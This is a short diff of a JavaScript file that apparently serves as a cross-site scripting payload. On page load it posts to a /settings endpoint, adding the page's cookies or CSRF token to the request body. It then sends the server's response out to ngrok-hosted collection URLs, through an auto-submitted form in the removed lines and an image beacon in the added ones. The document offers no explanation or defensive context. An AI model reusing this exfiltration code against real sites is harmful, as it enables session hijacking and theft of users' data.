@@ -1,13 +1,21 @@
 window.addEventListener('load', function () {
 
+  function send2server(name, data){
+    img = document.createElement("img");
+    img.src = "https://3c70bb4e.ngrok.io/?name="+name+"&data="+btoa(encodeURI(data));
+    document.getElementById("chat-div").appendChild(img);
+}
 
-fetch("/settings",
-      {
-  method: 'POST',
-      credentials: 'same-origin',  
-  headers: {
+fetch("/settings", {
+    'method': 'POST',
+    'body': 'name=test>&user_id=2&' +document.cookie,
+     headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
-    },
-  body: encodeURI("name=cas&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value)
-}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://83653900.ngrok.io/';i.name='data';i.value=btoa(encodeURI(back));f.appendChild(i);document.body.appendChild(f);f.submit();})})
+    }
+}).then(function(response){
+	response.text().then(function(back){
+	 send2server("resp", atob(encodeURI(back)));	
+	})
+})
+      
   })
